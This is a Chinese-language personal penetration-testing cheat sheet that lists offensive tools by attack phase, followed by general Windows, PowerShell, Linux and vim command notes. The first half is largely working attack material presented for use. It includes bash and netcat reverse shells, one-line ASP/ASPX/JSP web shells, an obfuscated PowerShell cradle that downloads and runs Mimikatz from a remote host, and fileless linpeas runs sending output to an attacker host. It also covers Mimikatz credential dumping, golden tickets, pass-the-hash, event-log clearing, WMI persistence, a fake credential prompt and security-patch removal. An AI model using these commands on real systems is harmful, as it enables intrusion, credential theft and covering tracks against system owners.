# Tool_CLI

[TOC]

## Tool





Reconnaissance

google,ping,nslookup,dig,whois,subfinder,amass,gobuster,wfuzz,meltego



Foothold

nmap,dirb,御剑,jsfinder,linkfinder,whatweb,sqlmap,ehole,imb-aascan,awvs,nexpose,openvas,北极熊,nikto,sn1per,nessus,ldb,wafw00f,curl,webdev,testdev,spscan,fuff,feroxbuster,dirsearch,curl,wget,git,impacket,nxc,smbclient,smbmap,rpcclient,enum4linux-ng,rdesktop,swaks,sqlmap,sqsh,hydra,aircrack-ng,arpspoof,ettercap,bettercap,burpsuite,yakit



Enumeration

peass,metasploit,powerview-python,bloodhound,bloodhound-python,nxc



Privilege_Escalation

peass,powerup,metasploit,*potato.exe,RunAs,impacket,searchsploit,hydra



Lateral_Movement

ntpdate,powerview-python,impacket,nxc,enum4linux-ng,rpcclient,metasploit,kerbrute,evil-winrm,mimikatz,hashcat,john,rubeus,responder,krbrelay



proxifier,proxychains,portfwd,autoroute,chisel,earthworm,ssh,iox,frp,neo-regeorg,pingtunnel,6tunnel



certutil,bitsadmin,vbs,wget,curl,nc,scp,metasploit,invoke-webrequest,python,php,ruby,jweserver,miniserve,npx,impacket,nc,gzip,bzip2,xz,tar,zip,rar,7z,makecab&cabextract,compress-archive&expand-archive,runasCs,rlwrap,findstr,find,grep



Persistence

impacket,mimikatz,certipy-ad,powerview



Covering_Tracks

metasploit,mimikatz



Credential_Binary

hydra,impacket,john,hashcat,metasploit,cupp,cewl,crunch,hash-identifier,hashid,nth,openssl,mkpasswd,ssh-keygen

ollydbg,x64dbg,windbg,immunitydebugger,cheatengine,ida

#### Metasploit,CobaltStrike

Metasploit

连接数据库

msfdb init

cat /usr/share/metasploit-framework/config/database.yml

db_connect msf:@127.0.0.1/msf

msfdb_status

会话转移

Metasploit(high_level)->CobaltStrike

listen : name Metasploit_CobaltStrike

listen : Beacon HTTP

listen : http_host 192.168.12.130

listen : http_port 20000

use exploit/windows/local/payload_inject

set session 1

set payload windows/meterpreter/reverse_http

set lhost 192.168.12.130

set lport 20000

set DisablePayloadHandler True

set PrependMigrate True

CobaltStrike->Metasploit

use exploit/multi/handler

set payload windows/meterpreter/reverse_http

set lhost 192.168.12.130

set lport 10000

listen : name CobaltStrike_Metasploit #建立一个监听

listen : http_host 192.168.12.130

listen : http_port 10000

beacon> spawn CobaltStrike_Metasploit #运行spawn增加转移会话

#### peass

###### 目标不出网，文件不落地(peass)

```
kali : nc -lvnp 81 | tee linpeas_result.txt

python3 -m http.server 80

target : curl -L kali_link/linpeas.sh | sh | nc kali_link 81

less -r linpeas.txt #格式化显示
```

###### 目标无curl，无nc，不出网，文件不落地(peass)

```
kali : nc -lvnp 443 < linpeas.sh

kali : nc -lvnp 445

target : cat < /dev/tcp/192.168.12.130/443 | sh > /dev/tcp/192.168.12.130/445
```





#### 后门

###### cymothoa后门(被meterpreter代替)(进程注入)

###### wmi

Import-Module .\Persistence\Persistence.psm1

$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'

$UserOptions = New-UserPersistenceOption -Registry -AtLogon

Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose

<br>

#### dns隧道

###### idoine dns隧道

#### bloodyAD

```
bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 #连接

bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 add genericAll "CN=win2019,CN=Users,DC=two,DC=com" "CN=kk,CN=Users,DC=two,DC=com" #添加genericAll权限，实现kk对win2019的fullcontrol
```

#### ldapsearch

```
ldapsearch -x -H ldap://192.168.12.5 -b "cn=users,dc=two,dc=com" "name=krbtgt" #匿名查询

ldapsearch -x -H ldap://192.168.12.5 -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=krbtgt" #登录查询

ldapsearch -H "ldap://192.168.12.5" -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=*" dn #查询users组下的成员，并返回每个成员的dn
```

#### nxc bloodhound



peass #github.com/peass-ng/PEASS-ng

metasploit 

post/windows/gather/enum_applications #应用程序

post/windows/gather/enum_shares #共享

post/windows/gather/enum_unattend #无人值守文件



linenum

linux-smart-enumeration

linux-exploit-suggester

linuxprivchecker.py

unix-privesc-check



------



#### 后门

```
bash : /bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/80 0>&1"

php : 

asp : <%execute(request("cmd"))%>

aspx : <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>

jsp : <% Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));%> (无回显)
```

------

#### fscan

fscan.exe -h 192.168.1.1/24 (默认使用全部模块)

敏感路径

Auto_Wordlists

------

#### powershell

powershell -ep bypass ". .\powerview.ps1;get-domainuser"

powershell混淆mimikatz

powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.0'+'.101/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"

内存加载

powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.101/mimikatz.exe -ExeArgs "sekurlsa::logonpasswords" -ForceASLR

------

#### mimikatz (Procdump)

token::elevate #提升至system权限

privilege::debug

ntlm_hash抓取

lsadump::sam

读取已经打包的dmp

sekurlsa::minidump lsass.dump.dmp

lsass.exe内存抓取

sekurlsa::logonpasswords

导出lsass.exe进程中所有的票据 (会产生大量文件)

sekurlsa::tickets /export

读取所有域用户的哈希(需在域控上执行)

lsadump::lsa /patch

NTDS.DIT文件中提取密码哈希值(在域内任何机器)

lasdump::dcsync /domain:onetop.com /all /csv

PTH

Sekurlsa::pth /user:XX /domian:http://xx.com /ntlm:XXXXXXXX

PTK

sekurlsa::pth /user:xx/domain:xx.com /aes256:xxxxxxxxxxx

sekurlsa模块

获取HASH (LM,NTLM)

sekurlsa::msv

通过可逆的方式去内存中读取明文密码

sekurlsa::wdigest

假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码

sekurlsa::Kerberos

通过tspkg读取明文密码

sekurlsa::tspkg

通过livessp 读取明文密码

sekurlsa::livessp

通过ssp 读取明文密码

sekurlsa::ssp

通过以上各种方法读取明文密码

sekurlsa::logonPasswords

进程模块

process

列出进程列表

process::list

导出进程列表

process::exports

导入列表

process::imports

开始一个进程

process::start

停止一个程序

process::stop

冻结一个进程

process::suspend

从冻结中恢复

process::resume

运行一个程序

process::run notepad

以SYSTEM系统权限打开一个新的mimikatz窗口

process::runp

服务管理模块

service

列出当前服务

service::list

mimikatz 将自己注册为一个系统服务，这样每次系统起来就会自动运行了

service::+

终端服务模块

ts

支持多个用户同时在线

ts::multirdp

查看用户登录信息

ts::sessions

此时会跳出当前用户的账号，在主界面可以看到session为1的那个账号的已经登录了，我们输入密码可以看到他的登录信息，比如他在打开哪些文件

ts::remote /id:1

日志模块

event

清空安全日志

event:clear

避免新的日志继续产生（现在效果还不好，是一个试验性的功能）

event:drop

杂项模块

misc

misc::cmd

misc::regedit

misc::taskmgr

打开cmd，注册表编辑器，任务管理器等

监听剪切板

执行之后会一直监听着，直到我们输入Ctrl+c

misc::clip

令牌模块

token

token::whoami

查看我是谁

token::list

列出都有哪些登录了的账号

token::elevate /lab

假如lab域存在，我们可以假冒成为域管理员的token

token::revert

取消假冒

vault

vault::cred

查看系统凭据

mimikatz.exe lsadump::sam /system:system.hiv /sam:sam.hiv

procdump

procdump64.exe -accepteula -ma lsass.exe lsass.dump

privilege::debug

sekurlsa::minidump lsass.dump.dmp

sekurlsa::logonPasswords full

all module{

standard - Standard module [Basic commands (does not require module name)]

crypto - Crypto Module

sekurlsa - SekurLSA module [Some commands to enumerate credentials...]

kerberos - Kerberos package module []

ngc - Next Generation Cryptography module (kiwi use only) [Some commands to enumerate credentials...]

privilege - Privilege module

process - Process module

service - Service module

lsadump - LsaDump module

ts - Terminal Server module

event - Event module

misc - Miscellaneous module

token - Token manipulation module

vault - Windows Vault/Credential module

minesweeper - MineSweeper module

net -

dpapi - DPAPI Module (by API or RAW access) [Data Protection application programming interface]

busylight - BusyLight Module

sysenv - System Environment Value module

sid - Security Identifiers module

iis - IIS XML Config module

rpc - RPC control of mimikatz

sr98 - RF module for SR98 device and T5577 target

rdm - RF module for RDM(830 AL) device

acr - ACR Module

}mimikatz黄金票据

kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi

ms14 068自检

systeminfo |find "3011780"

\#MS14-068.exe -u 域用户@xie.com -p 域用户密码 -s 域用户SID只 -d 域控ip

MS14-068.exe -u hack@xie.com -p h123456. -s S-1-5-21-2189311154-2766837956-1982445477-1110 -d 192.168.10.14 

ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控

ms14-068.exe -u Administrator@god.org -p AAaa1234 -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.141

kerberos::ptc 票据路径

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1282.jpg)

机器名

注：注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入

6.2 隐藏功能

管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：

Copy

privilege::debug

misc::cmd

misc::regedit

misc::taskmgr

------

#### 修改注册表，以求明文

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1284.jpg)

手工

reg save HKLM\SYSTEM system.hiv

reg save HKLM\SAM sam.hiv

------

msf 和 cs 和 empire 和 nishang

powershell-import PowerUp.ps1

powershell invoke-allchecks

nishang

检查是否为虚拟机

check-vm

欺骗弹窗

invoke-CredentialsPhish

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1286.jpg)



Copy-VSS

sam和system文件

Copy-VSS [文件地址] –默认是在当前文件夹下面

Copy-VSS [文件地址] -DestinationDir C:temp –保存文件到指定文件下

FireBuster和FireListener

FireListener -PortRange 130-150

FireBuster 192.168.12.107 130-150 -Verbose

get-passhashes

哈希值获取

Invoke-PowerShelltcp

nc -lvnp 12345

Invoke-PowerShelltcp -Reverse -IPAddress 192.168.10.133 -Port 12345

invoke-powershelltcp -Bind -Port 3333

nc 192.168.10.1 3333

Invoke-PowerShelludp

nc -lup 23456

Invoke-PowerShelludp -Reverse -IPAddress 192.168.10.133 -Port 23456

invoke-powershelludp -bind -Port 3333

nc -nvu 192.168.10.1 3333

#### 删除补丁

remove-update 

remove-update all

remove-update security

remove-update kbxxxxx

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1288.jpg)



端口扫描

invoke-portscan -StartAddress 192.168.10.1 -EndAddress 192.168.10.255 -ScanPort -ResolveHost

empire 转交会话给 metsploit

在msf中的配置

获取session(特权用户传递会继承到特权)

exploit/multi/script/web_delivery

\#调用http站点的监听模块

msf6 exploit(multi/script/web_delivery) > set URIPATH /

\#设置路径。设置在根目录比较好调用

msf6 exploit(multi/script/web_delivery) > set LHOST 192.168.0.105

\#设置本地监听地址

msf6 exploit(multi/script/web_delivery) > set target 2 

\#使用Powershell目标

\#target：设置一个反弹会话的方式。Empire是基于powershell的，所以选PSH

msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http 

\#设置payload

\############################################################

在Empire中使用的模块

usemodule powershell_code_execution_invoke_metasploitpayload

\#调用msf模块

\#直接后面跟上meta就可以

set Agent XMUR3TVN

\#设置Agent 记得要使用id，不然会报错。第一次用的是rname后的名字就报错了

\#报错提示：ERROR: Agent not found for id a1 

set URL http://192.168.0.105:8080/

\#设置一下msf中生成的url



Add-DomainComputer/Add-ADComputer -ComputerName machine2 -ComputerPass 1qaz@WSX #添加AD域机器账户

Remove-DomainComputer/Remove-ADComputer -ComputerName machine2 #移除AD域机器账户



Get-DomainUser #查看AD域内所有账户或特定用户

Get-LocalUser

Add-DomainUser/Add-ADUser -UserName qq -UserPass 1qaz@WSX #添加AD域账户

Remove-DomainUser/Remove-ADUser -Identity "qq" #移除AD域账户



Get-DomainGroupMember [-Identity] #查看AD域组内用户

Add-DomainGroupMember/Add-GroupMember -Identity "administrators" -Members "qq" #添加AD域用户到组

Remove-DomainGroupMember/Remove-GroupMember -Identity "administrators" -Members "qq" #移除组中AD域用户



Get-DomainGroup [-Identity "administrators"] #获得全部/某个组信息

Get-DomainGroup -MemberIdentity "win2019" 查询用户所属组信息

Add-DomainGroup -Identity "qq-group" #添加域组



Get-DomainObject/Get-ADObject [-Identity] #查看AD域内域对象[-SearchBase "CN=Users,DC=two,DC=com"] 查询users容器中的对象

Set-DomainObject/Set-ADObject #添加AD域内域对象

Remove-DomainObject/Remove-ADObject #移除AD域内域对象



Get-DomainObjectOwner/Get-ObjectOwner #查询指定AD对象所有者信息

Set-DomainObjectOwner/Set-ObjectOwner #查询指定AD对象所有者信息



Add-DomainObjectAcl/Add-ObjectAcl #添加指定AD对象的ACL

Remove-DomainObjectAcl/Remove-ObjectAcl #移除指定AD对象的ACL



Get-DomainObjectAcl/Get-ObjectAcl

Get-DomainUser -Identity "win2019" #查询win2019对象的objectSid

Get-DomainObjectAcl -SecurityIdentifier "S-1-5-21-873118422-227618334-1429070027-1000"#查看win2019账户的权限（如果什么都没有就是没有权限）

Get-DomainObjectAcl -Identity "CN=win2019,CN=Users,DC=two,DC=com"#查看其他安全主体对win2019账户的权限

\#SecurityIdentifier 对 ObjectDN 所拥有的权限（ActiveDirectoryRights,AccessMask,ObjectAceType）

\#[-Select "SecurityIdentifier,ObjectDN,ActiveDirectoryRights,AccessMask,ObjectAceType" -TableView] 选择显示选项以及是否按照表格形式排列



Add-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #添加win2019对tow.com All 权限的acl

Remove-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #删除win2019对tow.com All 权限的acl







## CLI

#### windows 命令行操作(bat+powershell)

[F3]/[ctrl]+[F] 快速调出搜索栏

[F5] 刷新当前页面

[F11] 全屏

[F12] 另存为

[F2]/ 重命名

[F6] 网页将光标定位到地址栏

[printScreen]/[shift]+[win]+[s] 截图

[insert] 覆盖模式

[delete] 删除光标后面的字

------

bat

control 控制面板

regedit 注册表

taskmgr 任务管理器

sysdm.cpl 系统属性

firewall.cpl 防火墙设置

compmgmt.msc 计算机管理

devmgmt.msc 硬件设备管理

eventvwr 事件查看器

gpedit.msc 组策略

mstsc 远程桌面连接

taskschd.msc 打开定时任务

lusrmgr.msc 本地用户和组

chap 65001 设置编码为utf-8

set           #查看环境变量

gci env:   #查看环境变量

cls 清除屏幕

logoff 注销当前用户

dir md rd ren move del copy 

tree 

replace D:\1.txt D:\Temp // 使用D盘下的1.txt强制替换D盘Temp目录中的1.txt 文件

type 查看文本文件内容

more 逐屏的显示文本文件内容

time date 设置时间日期 00:00:00 YYYY/MM/DD

start /B xxx #将命令放到后台执行

findstr /S /I "passw" *.php

if 1 EQU 1 @(echo 1)

EQU-eq NEQ-ne LSS-lt LEQ-le GTR-gt GEQ-ge

for /d %i in (*) do @(echo %i) 输出 本目录下所有文件

for /r asdf %i in (*.txt) do @(echo %i)

for /f %i in (1.txt) do @(echo %i:111)

for /f "tokens=1 delims= " %i in ('dir') do @(echo %i:111)

/r：递归遍历文件 / 目录（含子目录）

/l：数字序列循环（类似 for 循环的经典用法）

for /L %i in (1,1,30);do @ping -w 1 -n 1 10.10.220.%i | findstr TTL

for ($i=1;$i -lt 20;$i++){ping -w 1 -n 1 10.10.220.$i | findstr TTL }

timeout 5 延迟5s

exit pause 

runas /user:qwe2 cmd #切换用户

saps powershell -verb runas #切换用户

------

powershell

get-executionpolicy 获得当前执行权限

set-executionpolicy remotesigned 更改权限为本地文件可运行（需要管理员权限）

set-executionpolicy remotesigned -Scope CurrentUser 仅修改当前用户权限（不需要管理员权限）

powershell -executionpolicy bypass -file book.ps1 #bypass 绕过执行权限

get-command -commandtype cmdlet 查看所有的cmdlet  gcm

get-module -listavailable 查看系统中的所有模块 gmo

get-process | get-member 查看对象结构 gps | gm

get-help 

基础语法

注释 #    <#   #>

变量 $name  $age  输出变量$name $($name)

$env:computer 

gci env:

数据类型

字符串，整数，小数，布尔值，数组（$arr = @(1,2,3,4,5,6)）,哈希表 $hax = @{name="tom";age=12} ,对象 $name=get-process

使用$str.gettype().Name 来查看变量类型

$_ 管道中当前处理的对象

作用域

$global:name = "Tom"       # 全局变量

$name = "Alice"            # 本地变量

function Show-Name {

​    $name = "Bob"          # 函数内的局部变量

​    Write-Output "函数内部：$name"

} ; Show-Name

Write-Output "函数外部：$name"

Write-Output "全局变量：$global:name"

运算符

 \+ - * / % 

-eq -ne -lt -gt

-and -or -not

流程控制

if ($age -ge 80) {pass} elseif ($age -ne 80) {pass} else {pass}

switch ($value) { "start" { echo "begin" } "stop" { echo "stop" } default {echo "unknown" } }

for ($i = 1; $i -le 5; $i++) {pass}

$colors = @("red","green","blue") ; foreach ($color in $colors ) {pass}

$count = 0 ; while ($count -lt 3) { pass ; $count++}

$count = 0 ; do { pass ; $count++} while ($count -lt 3)

function say-hello { param([string]$name) ; write-output "hello,$name!" } ; say-hello -name powershell

function square($x) { return $x * $x} square 5

异常处理

try { } catch { } finally {} #catch块 只能捕获强制报错 

-ErrorAction Stop 跟在语句后面可将未停止报错，改变为强制报错 

文件操作

get-content xx #gc cat type

set-content xx xx #sc

add-content xx xx #ac

get-childitem -force/-recurse  #gci ls dir

new-item  [-ItemType Directory] 1.txt /dir_1 #mkdir ni

remove-item -path "c:\demo" [-recurse] [-force] #ri rm rmdir del erase rd

copy-item -path "c:\demo" -destination "d:\demo2" [-recurse] #cpi cp copy

move-item -path "c:\demo.txt" -destination "c:\demo" #mi mv move

rename-item -path "c:\demo\example.txt" -newname "renamed.txt" #rni ren

进程和服务管理

get-process -name chrome, notepad #gps ps

start-process notepad saps [-verb runas] #saps start

stop-process (-name notepad stps)(-id 1234) [-force] #spps kill

get-service #gsv 

start-service -name W32time #sasv

stop-service -name W32time #spsv

restart-service -name W32time 

set-service -name W32Time [-startuptype automatic/disabled ] 

new-Service -Name "服务名称" -BinaryPathName "可执行文件路径" -DisplayName "显示名称" -Description "描述" -StartupType <启动类型>

参数说明：

-Name：服务的名称（在服务管理器中使用的名称）。

-BinaryPathName：服务对应的可执行文件的路径。

-DisplayName：在服务管理器中显示的名称。

-Description：服务的描述。

-StartupType：服务的启动类型，可以是以下值之一：Automatic（自动）、Manual（手动）、Disabled（禁用）。

网络与系统管理

test-connection [-computername] www.baidu.com -count 4 #ping

get-netipaddress #ipconfig

get-nettcpconnection [-localport 80] #netstat

clear-dnsclientcache #清除DNS缓存

get-computerinfo #systeminfo gin

get-volume #获取磁盘信息

Get-CimInstance [-ClassName] Win32_BIOS #gcim

用户组管理

get-localuser #glu 获取当前用户列表 

disable-localuser [-name] "testuser" #dlu 禁用用户

enable-localuser [-name] "testuser" #elu 启用用户

get-localgroup #查看本地组

get-localgroupmember #查看组包含的成员

对象，管道和过滤

Where-Object #where ?

sort-object #sort

select-object #select

| #管道符传递对象而不是文本

Get-Service | ? {$_.Status -eq "Running"} | sort DisplayName #获取所有服务对象，筛选出状态为running的服务，根据服务名进行排序.

get-service | ? { $_.name -like[-eq/-ne/-lt/-le/-gt/-ge] "win*" }

Get-Service | Select-object Name,Status

(get-process)[0].Name 查看第一个对象进程的name属性

get-process | select-object name,@{name="nana";expression={$_.name}}   @{name="";expression={}} 起别名，name是名字，expression是计算逻辑

get-process | sort-object id         按照id排序

get-service | group-object status     按照服务状态分组

get-service | format-table -property name, status, displayname #ft 以表格形式显示服务信息

get-service | out-file 2.txt

字符串操作

子字符串提取

$string.substring(0,10) #提取1-10的字符串

$string.substring(10) #提取10之后的字符串

$string.substring($string.length - 3) #从末尾开始提取

$string[0..9] -join "" 

$string[-3..-1] -join ""

分割字符串

$csv.split(",") #以,分割

$data.split("|" , ";" , ",") #多分隔符

$data.split("\", 3) #分割2次

"name name" -split ","

正则表达式

匹配

-imatch #不区分大小写(默认)

-cmatch #区分大小写

-nomatch #取反

"powershell" -match ""

$text = "版本号: v1.2.3"

if ($text -match "v(\d+\.\d+\.\d+)") {

​    $matches[0]  # "v1.2.3" (完整匹配)

​    $matches[1]  # "1.2.3"  (第一个捕获组)

}

替换

"powershell" -replace "p", "8" #将p替换为8

"123-456-789" -replace "\D", "" #将非数字替换为空

"John Doe" -replace "(.*) (.*)", '$2, $1'  # "Doe, John" 捕获组

字符串模板格式化

"姓名: {0}, 年龄: {1}" -f "John", 30  # "姓名: John, 年龄: 30"

Get-Date -Format "yyyy-MM-dd HH:mm:ss"  # "2024-01-15 10:30:25" #格式化

多行字符串

$template = @"

姓名: {0}

年龄: {1}

邮箱: {2}

"@

$template -f "John", 30, "john@example.com"

select-string #grep sls

Select-String -Path "file.txt" -Pattern "searchTerm"

Select-String -Path "*" -Pattern "error" [-Recurse] [-CaseSensitive:$false]

Select-String -Path "file.log" -Pattern "\d{3}-\d{2}-\d{4}"

\# 只显示匹配到的部分（而不是整行）

Select-String -Path "file.txt" -Pattern "warning" -AllMatches | ForEach-Object { $_.Matches.Value }

\# 显示匹配行及其后2行（-A 2）

Select-String -Path "file.txt" -Pattern "error" -Context 0,2

\# 显示匹配行及其前2行（-B 2）

Select-String -Path "file.txt" -Pattern "error" -Context 2,0

\# 显示匹配行及其前后各2行（-C 2）

Select-String -Path "file.txt" -Pattern "error" -Context 2,2

get-service | Export-Csv 1.csv   导成CSV格式

get-service | convertto-json | out-file 1.json  转成json格式

脚本编写

param (

​    [string]$name,

​    [int]$age

)

Write-Output "你好，$name，你的年龄是 $age 岁。"

.\greet.ps1 -name "小明" -age 18

imoprt-module mymodule.psm1 使用import-module导入模块

get-module 查看已加载的模块

say-hello 调用模块的函数

Start-Job -ScriptBlock {ping 127.0.0.1} #启动后台jobs

cmd /c "command"

powershell "command"

. .\xxx.ps1

powershell -ep bypass ". .\PowerView.ps1 ; get-domainuser "





#### linux 命令行操作(bash)

建立shell

nc -lvnp 8010

nc 127.0.0.1 8010 -e /bin/bash

nc -lvnp 8080

bash -i >& /dev/tcp/192.168.31.41/8080 0>&1

chgrp [-R] 属组名 文件名 #更改文件属组 -R 递归更改文件属组

chown [–R] 所有者 文件名

chown [-R] 所有者:属组名 文件名

chmod [-R] xyz 文件或目录

chmod u=rwx,g=rx,o=r 文件名

chmod u+r 文件名

pwd 显示当前所在目录

pwd -P 显示确实的路径而不是link路径

mkdir [-mp] 目录名称       -p递归创建目录

 rmdir [-p] 目录名称   仅仅能删除空的目录

cp [-afpri] source destionation       -a 相当于 -pdr    -p是联通文件属性一起复制，而非使用默认属性（备份常用）-r 递归复制 -i 询问是否覆盖 -d 若来源是链接档的属性，则复制链接当属性而非文件本身

rm [-rfi] 文件或目录     -f 强制删除 -r 递归删除 -i 询问是否动作

mv [-fiu] source destination -f 强制覆盖 -i 询问覆盖 -u 若目标比较新，才会升级

cat 由第一行显示文件内容

tac 由最后一行显示文件内容  是cat 倒着写的

nl  显示行号

more 一页一页的显示文件内容

less 与more类似，但可向前翻页

head [-n] 只看头几行

tail [-n] 只看尾巴几行

ln f1 f2        创建f1的硬连接f2 

ln -s f1 f3    创建f1的软连接f3

f1 改变，f2,f3改变

f1 删除，f2不受影响,f3无效

用户登录必须要有家目录和密码，且家目录权限必须可写可执行

最简创建 

useradd -m 用户名 ; passwd 用户名

useradd [-cdgGsu]

  -c comment 指定一段注释性描述

  -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录

  -g 指定用户所属的用户组

  -G 指定用户所属的附加组

  -s shell 指定用户登录shell

  -u 指定用户的用户 如果同时有-o选项，则可以重复使用其他用户的标识号

usermod

  -g 指定用户所属组

  -G 覆盖用户所属的附加组

userdel [-r] 用户名  删除用户 -r 删除用户以及主目录

passwd [-ludf] 用户 -f 强制用户下次登陆时修改口令 -d使账号无口令 -u 口令解锁 -l 锁定口令，禁用账号

groupadd [-go]  用户组 -g指定新用户组的GID -o 表示新用户组的GID 可以与已有用户组的GID相同

groupdel 用户组 删除用户组

groupmod [-gon] 用户组 -g GID -o 表示新用户组的GID 可以与已有用户组的GID相同 -n 更改用户组名字

newgrp root   将当前用户切换到root用户组 ，前提是root用户组是该用户的主组或附加组

df [-ahikHTm]  -h 以人类可读的方式显示输出结果，-k 以KB为单位显示磁盘使用情况（默认）-T显示文件系统的类型 -a 显示虚拟文件系统 -i显示inode使用情况

df -aT

du [-ahskm] -a 列出所有文件与目录容量 -h 以人们易读的容量格式（G/M）显示 -s 仅显示指定目录或文件总大小，不显示子目录大小 -k 以KBytes格式列出容量显示 -m 以MBytes 列出容量显示

fdisk -l 查看是否有U盘等存储空间

mkfs

mkfs -t ext4 /dev/sdb1 将/dev/sdb1格式化为ext4格式 （必须为未挂载格式）

fsck /dev/sdb1 检查修复未挂载的磁盘

挂载u盘操作 

fdisk -l

mkdir -p /mnt/usb

mount /dev/sdb1 /mnt/usb    

umount -l /mnt/usb  -l 强制退出挂载

ls &  #这里的&是指将这一条命令放到后台执行

jobs #可以看后台作业

fg #将后台作业转变为前台作业

------

vi/vim

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230016_1311.jpg)



命令模式、输入模式和命令行模式

[i] 切换到输入模式，在光标当前位置开始输入文本。（需要处于命令模式）

​    I 到行首插入

​    a 切换到插入模式在光标下一个位置开始输入文本

​    A 在行尾添加

​    o 在当前行的下方插入一个新行，并进入插入模式

​    O 在当前行的上方插入一个新行，并进入插入模式 

​    r 替换一个字符

​    R 替换模式

​    s 删除字符并进入插入模式

​    S 删除行并进入插入模式

[Esc] 返回命令模式

[:] 切换到底线命令模式 （需要处于命令模式）

输入模式 

方向键移动光标

鼠标点击光标位置

page up/page down 上/下翻页

insert 切换光标为输入/替换模式

命令模式（一般模式）

h光标向左移动

l光标向右移动

j光标向下移动

k光标向上移动

5j 光标向下移动5行

w / b 后一个单词，前一个单词

dw / yw 删除一个单词/复制一个单词

[Ctrl] + [f] 屏幕向下移动一页 相当于 page down

​    [Ctrl] + [d] 屏幕『向下』移动半页 

[Ctrl] + [b] 屏幕『向上』移动一页  相当于page up

​    [Ctrl] + [u] 屏幕『向上』移动半页 

n n表示数字 按下20光标会向右移动20个字符距离相当于20l

n n 为数字。光标向下移动 n 行(常用)相当于nj 

0 或功能键[Home] 移动到这一行的最前面字符处 (常用)

$ 或功能键[End] 移动到这一行的最后面字符处(常用)

G 移动到这个档案的最后一行(常用) 

nG n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu) 

gg 移动到这个档案的第一行，相当于 1G 啊！(常用) 

H 光标移动到这个屏幕的最上方那一行的第一个字符 

M 光标移动到这个屏幕的中央那一行的第一个字符 

L 光标移动到这个屏幕的最下方那一行的第一个字符 

/word ?word 向光标之上/下寻找一个字符串为word的字符串

n N 重复前一个搜索动作

:n1,n2s/word1/word2/g  在第n1，n2行之间查找word1，并将其替换为word2

:1,$s/word1/word2/g   从第一行到最后一行

:10,20s/^/#/g 在10~20行添加#注释

:10,20s/^/\/\//g  在10~20行添加//注释

x, X 向后/向前删除一个字符

dd 剪切当前行

  ndd

d1G 删除光标所在到第一行的所有数据

dG 删除光标所在行到最后一行的所有数据

d$ 删除游标所在处，到该行的最后一个字符 

d0 那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符 

yy 复制当前行

  nyy,y1G,yG,y$,y0

p 粘贴到光标下方

P 粘贴到光标上方

J 将光标所在行与下一行的数据结合成同一行 

u 撤销上一次操作

[ctrl + r] 返回撤销上一次之前的结果

. 重复上一个动作，例如删除就是删除

:w 保存文件

:q 退出

:q! 强制退出不保存修改

:wq 保存退出

:w [filename] 将编辑的数据存储为另一个档案

:r [filename] 将filename的文件粘贴到光标后面

:n1,n2 w [filename] 将 n1 到 n2 的内容储存成 filename 这个档案。 

:1,$w [filename]   从第一行到最后一行的内容存储成filename这个档案

:! command

:set nu 显示行号，设定之后，会在每一行的前缀显示该行的行号 

:set nonu 与 set nu 相反，为取消行号！ 

------

bash

\#!/bin/bash

命令执行

$()

``

your_name="qinjx"

readonly him_name     #只读变量，不能更改

unset variable_name

变量被删除后不能再次使用。unset 命令不能删除只读变量。

注释#

多行注释

:<

...

...

A

或者

: '

这是注释的部分。

可以有多行内容。

'

------

字符串

'abc' "abc"  

\#单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的

\#双引号里可以有变量，双引号里可以出现转义字符

拼接字符串 (单或者双)

echo "who are you" "i am fine\!"

who are you i am fine!

echo 'who are you' 'i am fine\!'

who are you i am fine\!

echo 'hello ${name}'

hello ${name}

获取字符串长度

string="1/2/3/4/5"

